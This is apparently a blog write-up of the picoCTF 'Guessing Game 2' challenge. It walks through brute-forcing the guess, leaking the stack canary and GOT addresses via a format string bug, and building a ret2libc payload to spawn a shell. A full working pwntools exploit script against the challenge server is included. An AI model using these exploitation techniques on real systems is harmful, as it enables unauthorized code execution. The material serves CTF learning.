# Blog
https://frc6.com/index.php/archives/49/

# Question
## Source
https://play.picoctf.org/events/3/challenges/challenge/89
## Description
It's the Return of your favorite game!
[Gussing Game 2.zip][1]
`nc jupiter.challenges.picoctf.org 13610`

# Tools
IDA
IDA remote linux debugger
vmware - kali linux
libc database search        https://libc.blukat.me

# Analysis
## vuln
I found there is a vuln to do the buffer overflow attack and a format string vuln in `win()` 

    void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner);//overflow
	printf("Congrats: ");
	printf(winner);//format string vuln
	printf("\n\n");
    }

## checksec
![checksec.png][2]

## find number of guess
### local
Use IDA debugger to debug it and find the random number:
set a breakpoint at .text:080486A3
![ida_rand.png][3]
I found the value of `eax` is FFFFF9A1, which is equal to -1631

    0xFFFFF9A1 xor 0xFFFFFFFF + 1 = 0x65E + 1 = 0x65F = 1631

![local_rand.png][4]
### remote
Unfortunately, this is not the correct number in the remote server
![remote_num_nope.png][5]
I found the number could only in the range (-4094,4096) b/c the following code

    long ans = (get_random() % 4096) + 1;

So try all possible number by using the following python code:

    from pwn import *
    sh = remote('jupiter.challenges.picoctf.org',13610)
    for num in range(-4094,4096):
    	sh.recvuntil('guess?\n')
    	sh.sendline(str(num))
    	print(str(num))
    	ret = sh.recvuntil('\n\n')
    	print(ret)
    	if ret == 'Congrats! You win! Your prize is this print statement!\n\n':
    		break

![remote_num_correct.png][6]

Now, I know the random number in the remote server is -31

## leck canary
I found there is a canary, so I tried to leck it by taking advantage of format string vuln.
![canary_ida.png][7]
Set a breakpoint at .text:080487D3
![bp_find_canary.png][8]
ebp+canary = FFC8BC7C
![canary.png][9]
esp = FFC8BA60
the canary can be treated as the 135th parameter (not include the format) of printf

    (0xFFC8BC7C - 0xFFC8BA60)/4 = 0x87 = 135

So, the canary can be 'leck'ed by input %135$p when it asking the winner's name.
![leck_canary.png][10]

#### python function to leck data in the stack


    from pwn import *
    
    sh = process('./vuln')
    #sh = remote('jupiter.challenges.picoctf.org',13610)
    # nc jupiter.challenges.picoctf.org 13610
    
    guess_num = '-1631'
    #guess_num = '-31'
    
    p = make_packer('all', endian='big', sign='unsigned')
    
    def leck_by_para_num(printf_para):
    	global sh
    	sh.recvuntil('guess?\n')
    	sh.sendline(guess_num)
    	sh.recvuntil('\nName? ')
    	sh.sendline('%'+str(printf_para)+'$p')
    	sh.recvuntil('Congrats: ')
    	sh.recv(2)
    	data = sh.recvuntil('\n\n')
    	data = int(data,16)
    	return data

Now, the canary can be gained by call `leck_by_para_num(135)`

    # find canary
    canary = leck_by_para_num(135)

## Note
The remote server has a different libc version with local, so we have to found the libc version of remote server. Then we can find the address of `system()` and `/bin/sh` in the libc, so we can do the ret2libc attack. 

## find address of GOT (_GLOBAL_OFFSET_TABLE_)
Try to leck some address of function from GOT (_GLOBAL_OFFSET_TABLE_)

Still break at .text:080487D3
![stack_got.png][11]
esp = FFC8BA60

    (0xFFC8BC4C - 0xFFC8BA60)/4 = 0x7B = 123

So, the address of GOT can be 'leck'ed by input %123$p when it asking the winner's name.
![got.png][12]

Also can be gained by call `leck_by_para_num(123)`

    # find GOT
    GOT = leck_by_para_num(123)

## find address of functions in GOT
View the GOT disassembly view
![got_ida.png][13]
I choose `gets` and `__libc_start_main` symbols.
`gets` is at the 0x10 offset of GOT (`GOT + 0x10`)
`__libc_start_main` is at the 0x24 offset of GOT (`GOT + 0x24`)
So we have to leck the data by input address. We can take advantage format string vuln again by input something include `%s`.

#### python function to leck data by input address

    def leck_by_address(address):
    	global sh
    	sh.recvuntil('guess?\n')
    	sh.sendline(guess_num)
    	sh.recvuntil('\nName? ')
    	payload = p(0x2531302473)#char('%10$s')
    	payload += p(0)*3
    	payload += p(0)*4
    	payload += p32(address)
    	sh.sendline(payload)
    	sh.recvuntil('Congrats: ')
    	data = sh.recv(4)
    	sh.recvuntil('\n\n')
    	data = u32(data)
    	return data

So, we can find address of `__libc_start_main` and `gets` function

    # find address of __libc_start_main
    addr___libc_start_main = leck_by_address(GOT + 0x24)
    print(hex(addr___libc_start_main))
    
    # find address of gets
    addr_gets = leck_by_address(GOT + 0x10)
    print(hex(addr_gets))

## python: find address of `__libc_start_main` and `gets` function
Do the following code:

![addr of functions in got.png][14]

## find libc version and address of `system` and `str_bin_sh`

> https://libc.blukat.me/

Do libc database search

![libc database search.png][15]

So, the libc of remote server is libc6-i386_2.27-3ubuntu1.2_amd64

    offset___libc_start_main = 0x018da0
    offset_system = 0x03cd80
    offset_str_bin_sh = 0x17bb8f

Given `addr___libc_start_main` and `offset___libc_start_main`, we can find the base address of libc, and, then, find `addr_system` and `addr_str_bin_sh`

    base_address = addr___libc_start_main - offset___libc_start_main
    addr_system = base_address + offset_system
    addr_str_bin_sh = base_address + offset_str_bin_sh

## ret2libc
### stack overflow plan

    ebp-0Ch        canary
    ebp+4          addr_system
    ebp+0Ch        addr_str_bin_sh

### python: payload

    payload = p(0x90)*(0x200)	#ebp-20Ch
    payload += p32(canary)	#ebp-0Ch
    payload += p32(0)	#ebp-8
    payload += p32(0)	#ebp-4
    payload += p32(0)	#ebp
    payload += p32(addr_system)	#ebp+4
    payload += p32(0xdeadbeef)	#ebp+8
    payload += p32(addr_str_bin_sh)	#ebp+0Ch

    sh.recvuntil('guess?\n')
    sh.sendline(guess_num)
    sh.recvuntil('\nName? ')
    sh.sendline(payload)
    
    sh.interactive()

Then we can access to shell by call `system('/bin/sh')`

## get shell and find flag
Run the following python code:

    from pwn import *
    
    #sh = process('./vuln')
    sh = remote('jupiter.challenges.picoctf.org',13610)
    # nc jupiter.challenges.picoctf.org 13610
    
    #guess_num = '-1631'
    guess_num = '-31'
    
    p = make_packer('all', endian='big', sign='unsigned')
    
    def leck_by_para_num(printf_para):
    	global sh
    	sh.recvuntil('guess?\n')
    	sh.sendline(guess_num)
    	sh.recvuntil('\nName? ')
    	sh.sendline('%'+str(printf_para)+'$p')
    	sh.recvuntil('Congrats: ')
    	sh.recv(2)
    	data = sh.recvuntil('\n\n')
    	data = int(data,16)
    	return data
    
    
    def leck_by_address(address):
    	global sh
    	sh.recvuntil('guess?\n')
    	sh.sendline(guess_num)
    	sh.recvuntil('\nName? ')
    	payload = p(0x2531302473)#char('%10$s')
    	payload += p(0)*3
    	payload += p(0)*4
    	payload += p32(address)
    	sh.sendline(payload)
    	sh.recvuntil('Congrats: ')
    	data = sh.recv(4)
    	sh.recvuntil('\n\n')
    	data = u32(data)
    	return data
    
    
    # find canary
    canary = leck_by_para_num(135)
    
    # find GOT
    GOT = leck_by_para_num(123)
    
    # find address of __libc_start_main
    addr___libc_start_main = leck_by_address(GOT + 0x24)
    
    # libc is libc6-i386_2.27-3ubuntu1.2_amd64
    
    # find address of system and str_bin_sh
    offset___libc_start_main = 0x018da0
    offset_system = 0x03cd80
    offset_str_bin_sh = 0x17bb8f
    
    base_address = addr___libc_start_main - offset___libc_start_main
    addr_system = base_address + offset_system
    addr_str_bin_sh = base_address + offset_str_bin_sh
    
    # overflow
    
    payload = p(0x90)*(0x200)	#ebp-20Ch
    payload += p32(canary)	#ebp-0Ch
    payload += p32(0)	#ebp-8
    payload += p32(0)	#ebp-4
    payload += p32(0)	#ebp
    payload += p32(addr_system)	#ebp+4
    payload += p32(0xdeadbeef)	#ebp+8
    payload += p32(addr_str_bin_sh)	#ebp+0Ch
    
    sh.recvuntil('guess?\n')
    sh.sendline(guess_num)
    sh.recvuntil('\nName? ')
    sh.sendline(payload)
    
    sh.interactive()


![flag.png][16]

So the flag is `picoCTF{p0p_r0p_4nd_dr0p_1t_3c29990aa7386650}`

  [1]: https://frc6.com/usr/uploads/2020/10/2971545081.zip
  [2]: https://frc6.com/usr/uploads/2020/10/4108005776.png
  [3]: https://frc6.com/usr/uploads/2020/10/3723486194.png
  [4]: https://frc6.com/usr/uploads/2020/10/2670320421.png
  [5]: https://frc6.com/usr/uploads/2020/10/2349705066.png
  [6]: https://frc6.com/usr/uploads/2020/10/2446962559.png
  [7]: https://frc6.com/usr/uploads/2020/10/652770218.png
  [8]: https://frc6.com/usr/uploads/2020/10/1411080372.png
  [9]: https://frc6.com/usr/uploads/2020/10/3912975445.png
  [10]: https://frc6.com/usr/uploads/2020/10/1268743115.png
  [11]: https://frc6.com/usr/uploads/2020/10/2294887826.png
  [12]: https://frc6.com/usr/uploads/2020/10/2816564190.png
  [13]: https://frc6.com/usr/uploads/2020/10/532307689.png
  [14]: https://frc6.com/usr/uploads/2020/10/215960980.png
  [15]: https://frc6.com/usr/uploads/2020/10/666389066.png
  [16]: https://frc6.com/usr/uploads/2020/10/1084771796.png
